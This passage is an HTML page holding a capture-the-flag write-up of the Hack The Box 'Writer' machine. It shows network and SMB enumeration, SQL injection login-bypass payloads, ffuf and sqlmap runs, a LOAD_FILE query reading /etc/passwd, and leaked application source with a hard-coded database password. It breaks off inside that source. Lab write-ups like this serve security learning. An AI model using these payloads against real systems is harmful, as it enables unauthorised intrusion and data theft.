@@ -1,0 +1,1247 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="ie=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=author content="[map[name:MindYourPrivacy]]">
+<meta name=description content="A SQLi vulnerability allows to explore the Apache configuration and source code: it is vulnerable to a command injection vulnerability.
+Upon successful exploitation, we obtain a reverse shell and find a user password hash in a mysql database.
+Once cracked we have a stable SSH shell and we can exploit a postfix disclaimer vulnerability to pivot to another user.
+This last user has excessive permissions on apt, which can be used for privilege escalation to root.
+">
+<meta name=keywords content=",sqli,ffuf,sqlmap,postfix,smtp,apt">
+<meta name=robots content="noodp">
+<meta name=theme-color content>
+<link rel=canonical href=https://0xade1.github.io/posts/2021/10/htb-writer/>
+<title>
+Htb Writer :: Poney Island — Welcome to Pwnie Island
+</title>
+<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css>
+<link rel=stylesheet href=https://0xade1.github.io/main.d5b952c3b0131e8ecd6d80f97c5fae89d216a2c29dfa0754010b808bdb098871.css>
+<link rel=apple-touch-icon sizes=180x180 href=https://0xade1.github.io/apple-touch-icon.png>
+<link rel=icon type=image/png sizes=32x32 href=https://0xade1.github.io/favicon-32x32.png>
+<link rel=icon type=image/png sizes=16x16 href=https://0xade1.github.io/favicon-16x16.png>
+<link rel=manifest href=https://0xade1.github.io/site.webmanifest>
+<link rel=mask-icon href=https://0xade1.github.io/safari-pinned-tab.svg color=#1b1c1d>
+<link rel="shortcut icon" href=https://0xade1.github.io/favicon.ico>
+<meta name=msapplication-TileColor content="#1b1c1d">
+<meta name=theme-color content="#1b1c1d">
+<meta itemprop=name content="Htb Writer">
+<meta itemprop=description content="A SQLi vulnerability allows to explore the Apache configuration and source code: it is vulnerable to a command injection vulnerability.
+Upon successful exploitation, we obtain a reverse shell and find a user password hash in a mysql database.
+Once cracked we have a stable SSH shell and we can exploit a postfix disclaimer vulnerability to pivot to another user.
+This last user has excessive permissions on apt, which can be used for privilege escalation to root.
+"><meta itemprop=datePublished content="2021-10-26T01:37:15+08:00">
+<meta itemprop=dateModified content="2021-10-26T01:37:15+08:00">
+<meta itemprop=wordCount content="3248"><meta itemprop=image content="https://0xade1.github.io">
+<meta itemprop=keywords content="sqli,ffuf,sqlmap,postfix,smtp,apt,">
+<meta name=twitter:card content="summary_large_image">
+<meta name=twitter:image content="https://0xade1.github.io">
+<meta name=twitter:title content="Htb Writer">
+<meta name=twitter:description content="A SQLi vulnerability allows to explore the Apache configuration and source code: it is vulnerable to a command injection vulnerability.
+Upon successful exploitation, we obtain a reverse shell and find a user password hash in a mysql database.
+Once cracked we have a stable SSH shell and we can exploit a postfix disclaimer vulnerability to pivot to another user.
+This last user has excessive permissions on apt, which can be used for privilege escalation to root.
+">
+<meta property="og:title" content="Htb Writer">
+<meta property="og:description" content="A SQLi vulnerability allows to explore the Apache configuration and source code: it is vulnerable to a command injection vulnerability.
+Upon successful exploitation, we obtain a reverse shell and find a user password hash in a mysql database.
+Once cracked we have a stable SSH shell and we can exploit a postfix disclaimer vulnerability to pivot to another user.
+This last user has excessive permissions on apt, which can be used for privilege escalation to root.
+">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://0xade1.github.io/posts/2021/10/htb-writer/"><meta property="og:image" content="https://0xade1.github.io"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2021-10-26T01:37:15+08:00">
+<meta property="article:modified_time" content="2021-10-26T01:37:15+08:00">
+<meta property="article:published_time" content="2021-10-26 01:37:15 +0800 +0800">
+</head>
+<body>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=https://0xade1.github.io/ style=text-decoration:none>
+<div class=logo>
+<span class=logo__mark>></span>
+<span class=logo__text># cd /root/</span>
+<span class=logo__cursor>
+</span>
+</div>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class=menu__inner><li><a href=https://0xade1.github.io/about/>About</a></li><li><a href=https://0xade1.github.io/categories/>Categories</a></li><li><a href=https://0xade1.github.io/posts/>Posts</a></li><li><a href=https://0xade1.github.io/series/>Series</a></li><li><a href=https://0xade1.github.io/tags/>Tags</a></li>
+</ul>
+</nav>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<main class=post>
+<div class=post-info><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" ecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
+2021-10-25
+|
+</div>
+<article>
+<h1 class=post-title>
+<a href=https://0xade1.github.io/posts/2021/10/htb-writer/>Htb Writer</a>
+</h1>
+<div class=post-info>
+<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7" y2="7"/></svg>
+<span class=tag><a href=https://0xade1.github.io/tags/sqli/>sqli</a></span>
+<span class=tag><a href=https://0xade1.github.io/tags/ffuf/>ffuf</a></span>
+<span class=tag><a href=https://0xade1.github.io/tags/sqlmap/>sqlmap</a></span>
+<span class=tag><a href=https://0xade1.github.io/tags/postfix/>postfix</a></span>
+<span class=tag><a href=https://0xade1.github.io/tags/smtp/>smtp</a></span>
+<span class=tag><a href=https://0xade1.github.io/tags/apt/>apt</a></span>
+</p>
+</div>
+<div class=post-excerpt>A SQLi vulnerability allows to explore the Apache configuration and source code: it is vulnerable to a command injection vulnerability.
+Upon successful exploitation, we obtain a reverse shell and find a user password hash in a mysql database.
+Once cracked we have a stable SSH shell and we can exploit a postfix disclaimer vulnerability to pivot to another user.
+This last user has excessive permissions on apt, which can be used for privilege escalation to root.
+</div>
+<div class=post-content>
+<h2 id=enumeration>Enumeration</h2>
+<pre><code>rustscan -a  10.10.11.101 -t 2000  -- -Pn -A -sCV
+Open 10.10.11.101:22
+Open 10.10.11.101:80
+Open 10.10.11.101:139
+Open 10.10.11.101:445
+PORT    STATE SERVICE     REASON  VERSION
+22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: GET HEAD OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Story Bank | Writer.HTB
+139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
+445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>Web enumeration:</p>
+<pre><code>gobuster dir -u http://writer.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 30
+/contact (Status: 200)
+/logout (Status: 302)
+/about (Status: 200)
+/static (Status: 301)
+/dashboard (Status: 302)
+/server-status (Status: 403)
+/administrative (Status: 200)
+</code></pre>
+<p>Smb exploration:</p>
+<pre><code>smbmap -H 10.10.11.101
+[+] Finding open SMB ports....
+[+] User SMB session established on 10.10.11.101...
+[+] IP: 10.10.11.101:445        Name: writer.htb
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        writer2_project                                         NO ACCESS
+        IPC$                                                    NO ACCESS       IPC Service (writer server (Samba, Ubuntu))
+</code></pre>
+<p><a href=https://github.com/CiscoCXSecurity/enum4linux>enum4linux</a> is a Perl wrapper around the Samba tools smbclient, rpclient, net and nmblookup.</p>
+<pre><code>./enum4linux.pl -a 10.10.11.101
+[..]
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+
+S-1-22-1-1000 Unix User\kyle (Local User)
+S-1-22-1-1001 Unix User\john (Local User)
+</code></pre>
+<h2 id=sql-injection>SQL Injection</h2>
+<p>On the /administrative page we find a login form. We identify a SQL Injection vulnerability on the username. Upon successful exploitation We are redirected to a dashboard.</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>cleartext</td>
+<td>uname=test' or 1=1; &ndash; -</td>
+</tr>
+<tr>
+<td>urlencoded</td>
+<td>uname=test'+or+1%3d1%3b+&ndash;+-</td>
+</tr>
+</tbody>
+</table>
+<p>FFUFF is much faster at finding SQL Injections; I first need to capture with Burp the POST requests into a text file:</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-http data-lang=http><span style=color:#50fa7b>POST</span> /administrative <span style=color:#ff79c6>HTTP</span><span style=color:#ff79c6>/</span><span style=color:#bd93f9>1.1</span>
+Host<span style=color:#ff79c6>:</span> writer.htb
+User-Agent<span style=color:#ff79c6>:</span> Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept<span style=color:#ff79c6>:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language<span style=color:#ff79c6>:</span> en-US,en;q=0.5
+Accept-Encoding<span style=color:#ff79c6>:</span> gzip, deflate
+Content-Type<span style=color:#ff79c6>:</span> application/x-www-form-urlencoded
+Content-Length<span style=color:#ff79c6>:</span> 42
+Origin<span style=color:#ff79c6>:</span> http://writer.htb
+Connection<span style=color:#ff79c6>:</span> close
+Referer<span style=color:#ff79c6>:</span> http://writer.htb/administrative
+Upgrade-Insecure-Requests<span style=color:#ff79c6>:</span> 1
+
+uname=UNAME&amp;password=PASS
+</code></pre></td></tr></table>
+</div>
+</div><p>Then I can install and run FFUFF. <a href=https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html#pitchfork>Everything you need to know about FFUF is here</a>. A Masterclass.</p>
+<pre><code>git clone https://github.com/ffuf/ffuf ; cd ffuf ; go get ; go build
+
+ffuf -X POST -request ~/htb/writer/req.txt \
+        -w /opt/SecLists/Fuzzing/SQLi/Generic-SQLi.txt:UNAME \
+        -w /opt/SecLists/Fuzzing/SQLi/Generic-SQLi.txt:PASS  \
+        -t 200 -request-proto http -mode pitchfork -c -fs 808
+
+[Status: 200, Size: 607, Words: 5, Lines: 1, Duration: 247ms]
+* PASS: ' or 1=1 or ''='
+* UNAME: ' or 1=1 or ''='
+</code></pre>
+<p>We are redirected to a Dashboard</p>
+<p>Before exploring the dashboard, we can execute sqlmap to get more details on the vulnerable query:</p>
+<pre><code>./sqlmap.py -r ~/htb/writer/req.txt
+[..]
+Parameter: uname (POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: uname=UNAME' AND (SELECT 2843 FROM (SELECT(SLEEP(5)))YloQ) AND 'lodh'='lodh&amp;password=PASS
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 6 columns
+    Payload: uname=UNAME' UNION ALL SELECT NULL,CONCAT(0x716b7a6a71,0x464271526b594b6675575467647a4c4d6b787a6d577a704765424e71434744546651494e69536e74,0x7170627a71),NULL,NULL,NULL,NULL-- -&amp;password=PASS
+</code></pre>
+<p>We have permissions to read files:</p>
+<pre><code>./sqlmap.py -r ~/htb/writer/req.txt --privileges
+database management system users privileges:
+[*] 'admin'@'localhost' [1]:
+    privilege: FILE
+</code></pre>
+<p>Let&rsquo;s craft a query to extract files:</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>plain</td>
+<td>' UNION ALL SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5,6;&ndash; -</td>
+</tr>
+<tr>
+<td>urlencode</td>
+<td>&lsquo;+UNION+ALL+SELECT+1,LOAD_FILE('/etc/passwd&rsquo;),3,4,5,6%3b&ndash;+-</td>
+</tr>
+</tbody>
+</table>
+<p>We can find users john and kyle.</p>
+<pre><code>kyle❌1000:1000:Kyle Travis:/home/kyle:/bin/bash
+john❌1001:1001:,,,:/home/john:/bin/bash
+</code></pre>
+<p>The default layout for apache 2.x on ubuntu is described on <a href=https://cwiki.apache.org/confluence/display/httpd/DistrosDefaultLayout#DistrosDefaultLayout-Debian,Ubuntu(Apachehttpd2.x)>apache wiki</a>, but is not so precise. To be more precise, let&rsquo;s download apache-2.4.41 to see it&rsquo;s structure:</p>
+<pre><code>docker run --rm -it ubuntu bash
+root@98853d8e4b8f:/# apt-get update
+root@98853d8e4b8f:/# apt list -a apache2 | grep 2.4.41
+[..]
+apache2/focal-updates 2.4.41-4ubuntu3.7 amd64
+apache2/focal-security 2.4.41-4ubuntu3.6 amd64
+apache2/focal 2.4.41-4ubuntu3 amd64
+root@98853d8e4b8f:/# apt-get install apache2=2.4.41-4ubuntu3.7 ssl-cert
+root@98853d8e4b8f:/# cd /etc/apache2/
+root@98853d8e4b8f:/etc/apache2# find . | egrep &quot;sites|apache2&quot; | grep conf
+./sites-enabled/000-default.conf
+./apache2.conf
+./sites-available/000-default.conf
+./sites-available/default-ssl.conf
+</code></pre>
+<p>Exploring default sites available we find two more interesting files and directories:</p>
+<ul>
+<li>/var/www/writer.htb/writer is the root directory</li>
+<li>/var/www/writer.htb/writer/wsgi is the website</li>
+</ul>
+<p>000-default.conf:</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml># Virtual host configuration for writer.htb domain
+<span style=color:#ff79c6>&lt;VirtualHost</span> *:80<span style=color:#ff79c6>&gt;</span>
+        ServerName writer.htb
+        ServerAdmin admin@writer.htb
+        WSGIScriptAlias / /var/www/writer.htb/writer.wsgi
+        <span style=color:#ff79c6>&lt;Directory</span> /var/www/writer.htb<span style=color:#ff79c6>&gt;</span>
+                Order allow,deny
+                Allow from all
+        <span style=color:#ff79c6>&lt;/Directory&gt;</span>
+        Alias /static /var/www/writer.htb/writer/static
+        <span style=color:#ff79c6>&lt;Directory</span> /var/www/writer.htb/writer/static<span style=color:#ff79c6>/&gt;</span>
+                Order allow,deny
+                Allow from all
+        <span style=color:#ff79c6>&lt;/Directory&gt;</span>
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        LogLevel warn
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+<span style=color:#ff79c6>&lt;/VirtualHost&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>writer.wsgi:</p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#6272a4>#!/usr/bin/python</span>
+<span style=color:#ff79c6>import</span> sys
+<span style=color:#ff79c6>import</span> logging
+<span style=color:#ff79c6>import</span> random
+<span style=color:#ff79c6>import</span> os
+
+<span style=color:#6272a4># Define logging</span>
+logging<span style=color:#ff79c6>.</span>basicConfig(stream<span style=color:#ff79c6>=</span>sys<span style=color:#ff79c6>.</span>stderr)
+sys<span style=color:#ff79c6>.</span>path<span style=color:#ff79c6>.</span>insert(<span style=color:#bd93f9>0</span>,<span style=color:#f1fa8c>&#34;/var/www/writer.htb/&#34;</span>)
+
+<span style=color:#6272a4># Import the __init__.py from the app folder</span>
+<span style=color:#ff79c6>from</span> writer <span style=color:#ff79c6>import</span> app <span style=color:#ff79c6>as</span> application
+application<span style=color:#ff79c6>.</span>secret_key <span style=color:#ff79c6>=</span> os<span style=color:#ff79c6>.</span>environ<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>&#34;SECRET_KEY&#34;</span>, <span style=color:#f1fa8c>&#34;&#34;</span>)
+</code></pre></td></tr></table>
+</div>
+</div><p>We infer from row 12 that there is a <strong>/var/www/writer.htb/writer/__init__.py</strong></p>
+<div class=highlight><div style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
+<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">65
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">66
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">67
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">68
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">69
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">70
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">71
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">72
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">73
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">74
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">75
+</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">76
+</span></code></pre></td>
+<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
+<pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#ff79c6>from</span> flask <span style=color:#ff79c6>import</span> Flask, session, redirect, url_for, request, render_template
+<span style=color:#ff79c6>from</span> mysql.connector <span style=color:#ff79c6>import</span> errorcode
+<span style=color:#ff79c6>import</span> mysql.connector
+<span style=color:#ff79c6>import</span> urllib.request
+<span style=color:#ff79c6>import</span> os
+<span style=color:#ff79c6>import</span> PIL
+<span style=color:#ff79c6>from</span> PIL <span style=color:#ff79c6>import</span> Image, UnidentifiedImageError
+<span style=color:#ff79c6>import</span> hashlib
+
+app <span style=color:#ff79c6>=</span> Flask(__name__,static_url_path<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;&#39;</span>,static_folder<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;static&#39;</span>,template_folder<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;templates&#39;</span>)
+
+<span style=color:#6272a4>#Define connection for database</span>
+<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>connections</span>():
+    <span style=color:#ff79c6>try</span>:
+        connector <span style=color:#ff79c6>=</span> mysql<span style=color:#ff79c6>.</span>connector<span style=color:#ff79c6>.</span>connect(user<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;admin&#39;</span>, password<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;ToughPasswordToCrack&#39;</span>, host<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;127.0.0.1&#39;</span>, database<span style=color:#ff79c6>=</span><span style=color:#f1fa8c>&#39;writer&#39;</span>)
+        <span style=color:#ff79c6>return</span> connector
+    <span style=color:#ff79c6>except</span> mysql<span style=color:#ff79c6>.</span>connector<span style=color:#ff79c6>.</span>Error <span style=color:#ff79c6>as</span> err:
+    [<span style=color:#ff79c6>..</span>snip<span style=color:#ff79c6>..</span>]
+
+@app<span style=color:#ff79c6>.</span>route(<span style=color:#f1fa8c>&#39;/dashboard/stories/edit/&lt;id&gt;&#39;</span>, methods<span style=color:#ff79c6>=</span>[<span style=color:#f1fa8c>&#39;GET&#39;</span>, <span style=color:#f1fa8c>&#39;POST&#39;</span>])
+<span style=color:#ff79c6>def</span> <span style=color:#50fa7b>edit_story</span>(<span style=color:#8be9fd;font-style:italic>id</span>):
